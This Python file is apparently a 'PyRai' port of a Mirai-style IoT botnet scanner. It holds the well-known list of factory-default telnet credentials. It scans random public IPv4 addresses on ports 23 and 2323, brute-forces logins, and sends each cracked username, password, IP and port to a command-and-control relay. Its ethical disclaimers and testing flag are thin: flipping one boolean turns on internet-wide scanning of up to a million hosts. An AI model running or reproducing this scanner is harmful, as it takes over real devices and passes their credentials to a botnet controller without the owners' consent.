#!/usr/bin/env python3
"""
PyRai Scanner Module - Updated for Secure Testing
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import socket, time, sys, telnetlib, os, hashlib, platform, logging
from random import randrange
from threading import Thread, Lock
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)

# TESTING SAFEGUARDS
TESTING_MODE = True  # Set to False only in authorized lab environments
MAX_SCAN_TARGETS = 100 if TESTING_MODE else 1000000
SCAN_DELAY = 2 if TESTING_MODE else 0.1

# Default credentials for IoT devices (common factory defaults)
MAlist = [('root','xc3511'),
          ('root','vizxv'),
          ('root','admin'),
          ('admin','admin'),
          ('root','888888'),
          ('root','xmhdipc'),
          ('root','default'),
          ('root','juantech'),
          ('root','123456'),
          ('root','54321'),
          ('support','support'),
          ('root',''),
          ('admin','password'),
          ('root','root'),
          ('root','12345'),
          ('user','user'),
          ('admin',''),
          ('root','pass'),
          ('admin','admin1234'),
          ('root','1111'),
          ('admin','smcadmin'),
          ('admin','1111'),
          ('root','666666'),
          ('root','password'),
          ('root','1234'),
          ('root','klv123'),
          ('Administrator','admin'),
          ('service','service'),
          ('supervisor','supervisor'),
          ('guest','guest'),
          ('guest','12345'),
          ('admin1','password'),
          ('administrator','1234'),
          ('666666','666666'),
          ('888888','888888'),
          ('ubnt','ubnt'),
          ('root','klv1234'),
          ('root','Zte521'),
          ('root','hi3518'),
          ('root','jvbzd'),
          ('root','anko'),
          ('root','zlxx.'),
          ('root','7ujMko0vizxv'),
          ('root','7ujMko0admin'),
          ('root','system'),
          ('root','ikwb'),
          ('root','dreambox'),
          ('root','user'),
          ('root','realtek'),
          ('root','00000000'),
          ('admin','1111111'),
          ('admin','1234'),
          ('admin','12345'),
          ('admin','54321'),
          ('admin','123456'),
          ('admin','7ujMko0admin'),
          ('admin','pass'),
          ('admin','meinsm'),
          ('tech','tech'),
          ('mother','fucker')] 

pindex = 0
pindex_lock = Lock()
scan_count = 0
scan_lock = Lock()

# Relay Configuration - UPDATE THESE FOR YOUR TEST ENVIRONMENT
__RELAY_H__ = "127.0.0.1"  # Changed to localhost for testing
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

# Scanner Configuration
__TIMEOUT__ = 3  # Increased timeout for stability
__C2DELAY__ = 5
__THREADS__ = 5  # Reduced for testing

def get_credentials():
    """Thread-safe credential retrieval"""
    global MAlist, pindex, pindex_lock
    with pindex_lock:
        if pindex >= len(MAlist):
            return None, None
        user = MAlist[pindex][0]
        password = MAlist[pindex][1]
        logging.info(f"[scanner] Trying {user}:{password}")
        pindex += 1
        return user, password

def c2crd(usr, psw, ip, port):
    """Send credentials to relay with enhanced error handling"""
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            logging.info("[scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            tcpClientA.settimeout(10)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            
            message = f"!{__RELAY_PS_}{usr}{__RELAY_PS_}{psw}{__RELAY_PS_}{ip}{__RELAY_PS_}{port}"
            tcpClientA.send(message.encode('ascii'))
            
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            
            if data == "10":
                tcpClientA.close() 
                logging.info("[scanner] Remote relay returned code 10(ok).")
                return True
                
        except Exception as e:
            retry_count += 1
            logging.error(f"[scanner] Unable to contact remote relay (attempt {retry_count}): {str(e)}")
            if retry_count < max_retries:
                time.sleep(5)
            
        finally:
            try:
                tcpClientA.close()
            except:
                pass
    
    logging.error("[scanner] Failed to contact relay after all retries")
    return False

def bruteport(ip, port):
    """Enhanced brute force with better error handling"""
    global pindex, pindex_lock
    logging.info(f"[scanner] Attempting to brute found IP {ip}")
    
    tn = None
    need_user = False
    max_attempts = 10
    attempt_count = 0
    
    try:
        while attempt_count < max_attempts:
            try:
                user = ""
                password = ""
                
                if not tn:
                    asked_password_in_cnx = False
                    tn = telnetlib.Telnet(ip, port, timeout=__TIMEOUT__)
                    logging.info(f"[scanner] Connection established to {ip}")
                
                while True:
                    response = tn.read_until(b":", 2)
                    response_str = str(response)
                    
                    if "Login:" in response_str or "Username:" in response_str:
                        logging.info("[scanner] Received username prompt")
                        need_user = True
                        asked_password_in_cnx = False 
                        user, password = get_credentials()
                        
                        if user is None:
                            logging.warning("[scanner] Out of credentials")
                            return False
                            
                        tn.write((user + "\n").encode('ascii'))
                        
                    elif "Password:" in response_str:
                        if asked_password_in_cnx and need_user:
                            tn.close()
                            break 
                            
                        asked_password_in_cnx = True 
                        
                        if not need_user:
                            user, password = get_credentials()
                            
                        if not password or user is None:
                            logging.warning("[scanner] Bruteforce failed, out of credentials")
                            return False
                            
                        logging.info("[scanner] Received password prompt")
                        tn.write((password + "\n").encode('ascii'))
                        
                    if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
                        logging.success(f"[scanner] Bruteforce succeeded {ip} : {user}:{password}")
                        c2crd(user, password, ip, port)
                        
                        # Reset credential index for next target
                        with pindex_lock:
                            pindex = 0
                        return True
                        
                if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
                    break
                    
                attempt_count += 1
                
            except EOFError as e:
                tn = None
                need_user = False
                logging.warning(f"[scanner] Remote host dropped connection: {str(e)}")
                time.sleep(2)
                attempt_count += 1
                
    except Exception as e:
        logging.error(f"[scanner] Brute force error on {ip}: {str(e)}")
        
    finally:
        if tn:
            try:
                tn.close()
            except:
                pass
                
    return False

def scan23(ip):
    """Enhanced port scanning with failover"""
    logging.info(f"[scanner] Scanning {ip}")
    
    # Check scan limit for testing
    global scan_count, scan_lock
    with scan_lock:
        if scan_count >= MAX_SCAN_TARGETS:
            logging.warning(f"[scanner] Reached testing limit of {MAX_SCAN_TARGETS} scans")
            return
        scan_count += 1
    
    # Primary port 23
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    
    try:
        result = sock.connect_ex((ip, 23))
        if result == 0:
            logging.info(f"[scanner] Found open telnet on {ip}:23")
            bruteport(ip, 23)
            return
    except Exception as e:
        logging.debug(f"[scanner] Error scanning {ip}:23 - {str(e)}")
    finally:
        sock.close()
    
    # Failover port 2323
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    
    try:
        result = sock.connect_ex((ip, 2323))
        if result == 0:
            logging.info(f"[scanner] Found open telnet on {ip}:2323")
            bruteport(ip, 2323)
            return
    except Exception as e:
        logging.debug(f"[scanner] Error scanning {ip}:2323 - {str(e)}")
    finally:
        sock.close()
    
    logging.debug(f"[scanner] No telnet services found on {ip}")

def generateIP():
    """Generate random IP with enhanced filtering for testing"""
    if TESTING_MODE:
        # In testing mode, generate IPs from safe ranges
        # Using RFC 3927 test ranges
        return f"192.0.2.{randrange(1, 254)}"  # TEST-NET-1
    
    # Original IP generation logic for lab environments
    blockOne = randrange(1, 255)
    blockTwo = randrange(0, 255)
    blockThree = randrange(0, 255)
    blockFour = randrange(1, 254)
    
    # Filter out reserved ranges
    reserved_ranges = [
        (127, None, None, None),  # Loopback
        (10, None, None, None),   # Private
        (172, 16, 31, None),      # Private
        (192, 168, None, None),   # Private
        (169, 254, None, None),   # Link-local
        (224, None, None, None),  # Multicast
    ]
    
    for reserved in reserved_ranges:
        if (blockOne == reserved[0] and 
            (reserved[1] is None or blockTwo == reserved[1]) and
            (reserved[2] is None or blockThree == reserved[2])):
            return generateIP()
    
    return f"{blockOne}.{blockTwo}.{blockThree}.{blockFour}"

def scanner_worker():
    """Worker thread for scanning"""
    while True:
        try:
            ip = generateIP()
            scan23(ip)
            time.sleep(SCAN_DELAY)  # Rate limiting for testing
        except KeyboardInterrupt:
            logging.info("[scanner] Worker thread stopping...")
            break
        except Exception as e:
            logging.error(f"[scanner] Worker error: {str(e)}")
            time.sleep(1)

def main():
    """Main scanner function with safety checks"""
    logging.info("="*50)
    logging.info("PyRai Scanner - Updated for Secure Testing")
    logging.info("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    logging.info("="*50)
    
    if TESTING_MODE:
        logging.warning("TESTING MODE ENABLED - Limited functionality")
        logging.info(f"Max targets: {MAX_SCAN_TARGETS}")
        logging.info(f"Scan delay: {SCAN_DELAY}s")
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This scanner will attempt to connect to remote systems.")
    print("Ensure you have proper authorization for all target networks.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        logging.error("Safety confirmation failed. Exiting.")
        sys.exit(1)
    
    logging.info(f"Starting {__THREADS__} scanner threads...")
    
    threads = []
    try:
        for i in range(__THREADS__):
            t = Thread(target=scanner_worker, daemon=True)
            t.start()
            threads.append(t)
            logging.info(f"Started scanner thread {i+1}")
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("Shutdown signal received...")
        sys.exit(0)

if __name__ == "__main__":
    main()
